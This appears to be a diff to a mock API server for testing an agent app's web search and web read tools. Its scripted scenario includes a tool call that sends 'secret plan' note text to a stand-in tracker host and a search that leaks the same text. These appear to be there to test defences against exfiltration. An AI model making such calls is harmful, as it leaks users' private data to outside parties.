@@ -69,8 +69,61 @@ http
         return j(404, { error: { status: 404, message: 'nope' } })
       }
       const b = JSON.parse(body)
-      anth.push({ tools: (b.tools ?? []).map((t) => t.name), messages: b.messages })
+      anth.push({
+        tools: (b.tools ?? []).map((t) => t.name),
+        toolTypes: (b.tools ?? []).map((t) => t.type ?? 'custom'),
+        system: b.system,
+        messages: b.messages
+      })
       save()
+      // Custard's isolated search call: only a query, hosted search, no stream.
+      if (typeof b.system === 'string' && b.system.startsWith('You run one web search')) {
+        const query = String(b.messages[0].content).replace(/^Query: /, '')
+        return j(200, {
+          id: 'msg_search',
+          type: 'message',
+          role: 'assistant',
+          model: b.model,
+          stop_reason: 'end_turn',
+          stop_sequence: null,
+          usage: { input_tokens: 10, output_tokens: 10 },
+          content: [
+            { type: 'server_tool_use', id: 'srv1', name: 'web_search', input: { query } },
+            {
+              type: 'web_search_tool_result',
+              tool_use_id: 'srv1',
+              content: [
+                {
+                  type: 'web_search_result',
+                  url: 'https://tea.example.com/guide',
+                  title: 'Tea guide',
+                  encrypted_content: 'e1',
+                  page_age: 'May 2026'
+                },
+                {
+                  type: 'web_search_result',
+                  url: 'https://other.example.org/page',
+                  title: 'Other page',
+                  encrypted_content: 'e2'
+                }
+              ]
+            },
+            {
+              type: 'text',
+              text: 'Green tea is brewed at about 80°C.',
+              citations: [
+                {
+                  type: 'web_search_result_location',
+                  url: 'https://tea.example.com/guide',
+                  title: 'Tea guide',
+                  encrypted_index: 'i1',
+                  cited_text: 'Brew green tea at 80°C.'
+                }
+              ]
+            }
+          ]
+        })
+      }
       let last = b.messages.length - 1
       while (
         last >= 0 &&
@@ -99,7 +152,9 @@ http
                     ? 'mixed'
                     : /loop test/.test(ask)
                       ? 'loop'
-                      : 'plain'
+                      : /web test/.test(ask)
+                        ? 'web'
+                        : 'plain'
       if (key === 'error' && step === 1)
         return j(400, {
           type: 'error',
@@ -164,6 +219,15 @@ http
         ],
         // Never gives a final answer, to reach the step limit.
         loop: [() => tool('vault_read', { path: 'Log.md' })],
+        // Search, read a result, try a link with private data in it, try
+        // another search, then answer citing the page it read.
+        web: [
+          () => tool('web_search', { query: 'green tea temperature' }),
+          () => tool('web_read', { url: 'https://tea.example.com/guide' }),
+          () => tool('web_read', { url: 'https://tracker.example.net/p?note=secret%20plan' }),
+          () => tool('web_search', { query: 'secret plan from my notes' }),
+          'Brew green tea at about 80°C, per [the tea guide](https://tea.example.com/guide).'
+        ],
         plain: ['OK.']
       }
       const s = scripts[key][Math.min(step, scripts[key].length - 1)]
